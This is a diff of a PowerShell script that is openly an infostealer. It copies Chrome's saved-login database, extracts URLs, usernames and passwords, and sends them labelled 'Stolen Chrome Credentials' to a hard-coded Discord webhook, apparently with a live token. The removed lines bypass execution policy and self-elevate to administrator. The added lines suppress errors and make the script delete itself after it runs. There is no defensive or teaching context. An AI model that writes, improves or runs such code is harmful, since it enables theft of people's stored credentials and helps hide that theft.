@@ -1,37 +1,25 @@
-# Bypass execution policy for this session
-Set-ExecutionPolicy Bypass -Scope Process -Force
-
-# Self-elevate PowerShell script
-If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{
-    # Create a new process as administrator
-    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
-    $newProcess.Arguments = "-File `"" + $PSCommandPath + "`"";
-    $newProcess.Verb = "runAs";
-    [System.Diagnostics.Process]::Start($newProcess) | Out-Null
-    Exit
-}
-
-# Replace this with your Discord Webhook URL
+# Discord webhook URL - replace with your actual webhook URL
 $webhookURL = "https://discord.com/api/webhooks/1302032038563414147/o5jjFWbs_6-_rTlE-BqdFf7Gayo5DkW8Cj2HXdpWr9eiOkfQv1N_iR-el8CvliJCNSMg"
 
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
+    # Get the Chrome Login Data file path
     $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
     $chromePath = "$localAppData\Google\Chrome\User Data\Default\Login Data"
     $tempPath = "$env:TEMP\LoginData.db"
 
-    # Copy the database to avoid locking issues
-    Copy-Item $chromePath $tempPath
+    # Copy the database to a temporary location to avoid file locks
+    Copy-Item -Path $chromePath -Destination $tempPath -ErrorAction SilentlyContinue
 
-    # Open the SQLite database and extract login details
+    # Connect to the SQLite database and extract login credentials
     $query = "SELECT origin_url, username_value, password_value FROM logins"
-    $connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tempPath;Version=3;"
+    $connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempPath;Version=3;")
     $connection.Open()
     $command = $connection.CreateCommand()
     $command.CommandText = $query
     $reader = $command.ExecuteReader()
 
+    # Collect results
     $result = @()
     while ($reader.Read()) {
         $url = $reader["origin_url"]
@@ -48,24 +36,28 @@ function Get-ChromePasswords {
         }
     }
 
+    # Close connection and remove temporary database file
     $connection.Close()
-    Remove-Item $tempPath
+    Remove-Item -Path $tempPath -Force
     return $result
 }
 
-# Format and send the results to Discord via Webhook
+# Function to send the results to Discord via Webhook
 function Send-ToDiscord {
     param ($data)
 
-    $json = @"
-    {
-        "content": "Stolen Chrome Credentials",
-        "embeds": [{
-            "title": "Credentials Found",
-            "description": "$data"
-        }]
-    }
-"@
+    # Format data as JSON for Discord embed
+    $json = @{
+        content = "Stolen Chrome Credentials"
+        embeds = @(
+            @{
+                title = "Credentials Found"
+                description = $data
+            }
+        )
+    } | ConvertTo-Json -Depth 4
+
+    # Send data to Discord webhook
     Invoke-RestMethod -Uri $webhookURL -Method POST -Body $json -ContentType 'application/json'
 }
 
@@ -77,3 +69,6 @@ if ($credentials.Count -gt 0) {
 } else {
     Write-Output "No credentials found"
 }
+
+# Delete the script itself after execution
+Remove-Item -Path "$env:TEMP\script.ps1" -Force
